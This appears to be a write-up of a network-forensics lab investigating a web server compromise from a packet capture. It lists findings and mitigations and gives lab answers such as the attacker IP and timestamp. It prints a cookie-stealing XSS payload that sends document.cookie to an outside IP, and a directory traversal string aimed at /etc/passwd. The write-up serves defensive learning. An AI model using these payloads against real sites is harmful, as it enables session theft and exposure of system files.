@@ -1,0 +1,87 @@
+# Web Server Compromise Investigation – PCAP Analysis
+
+## Overview
+
+In this lab, I analyzed network traffic in a PCAP file to investigate a web server compromise. The investigation focused on identifying the attacker's IP address, discovering the tools and techniques used, and finding evidence of web application attacks.
+
+## Investigation Findings
+
+### 1. Attacker IP Address
+
+The attacker IP address identified in the network traffic was `111.224.180.128`.
+
+### 2. Directory Brute-Forcing Tool
+
+The attacker used Gobuster to discover directories and files on the web server. This technique can help attackers identify exposed resources and potential entry points.
+
+### 3. Cross-Site Scripting (XSS) Payload
+
+The following JavaScript payload was identified:
+
+```javascript
+<script>fetch('http://111.224.180.128/' + document.cookie);</script>
+```
+
+The payload attempts to send the victim's browser cookies to the attacker's server. If executed in a victim's browser, this could expose session information and potentially allow session hijacking, depending on the cookie's protections and the application's security controls.
+
+### 4. Timestamp of the Suspicious Activity
+
+The identified timestamp was:
+
+`2024-03-29 12:09 UTC`
+
+This timestamp helped establish the timeline of the suspicious activity observed during the investigation.
+
+### 5. Session Token
+
+The session token identified in the traffic was:
+
+`xxxxxxxxxxxxxxxxx`
+
+Session tokens are sensitive because an exposed, valid token may allow unauthorized access to a user's account. This value is included here as a lab finding and should be redacted if it represents a real or reusable credential.
+
+### 6. PHP Script
+
+The PHP script identified during the investigation was:
+
+`log_viewer.php`
+
+This file was relevant to the web application activity observed in the PCAP and warranted further investigation to determine how it was accessed and whether it was abused.
+
+### 7. Directory Traversal Attempt
+
+The following directory traversal payload was identified:
+
+```text
+../../../../../etc/passwd
+```
+
+This payload attempts to access the Linux `/etc/passwd` file by navigating outside the intended directory. If the application handles file paths insecurely, this type of attack may expose sensitive system information.
+
+## Attack Summary
+
+The investigation revealed several suspicious activities associated with the same attacker IP address:
+
+1. Directory and file discovery using Gobuster.
+2. An XSS payload designed to send browser cookies to an external server.
+3. Exposure of a session token in the analyzed traffic.
+4. Suspicious activity involving the `log_viewer.php` script.
+5. A directory traversal payload targeting `/etc/passwd`.
+
+Together, these findings indicate attempts to discover web resources and exploit potential weaknesses in the web application. Each finding should be correlated with server logs and application evidence to determine the full impact of the activity.
+
+## Recommended Mitigations
+
+- Validate and sanitize user input to prevent XSS and directory traversal attacks.
+- Encode untrusted output before displaying it in a browser.
+- Use secure session management, including `HttpOnly`, `Secure`, and appropriate `SameSite` cookie attributes.
+- Restrict file access to approved directories and avoid constructing file paths directly from user input.
+- Monitor web server logs for directory enumeration, suspicious file access, and repeated probing.
+- Investigate suspicious PHP scripts and verify their integrity against trusted versions.
+- If a session token was exposed and is valid, invalidate the affected session and review related account activity.
+
+## Key Takeaways
+
+This lab helped me practice PCAP analysis, identify suspicious web traffic, recognize common web application attack techniques, and connect individual indicators to a broader investigation.
+
+It also reinforced the importance of correlating network traffic with web server logs before determining whether an attack was successful and assessing its impact.
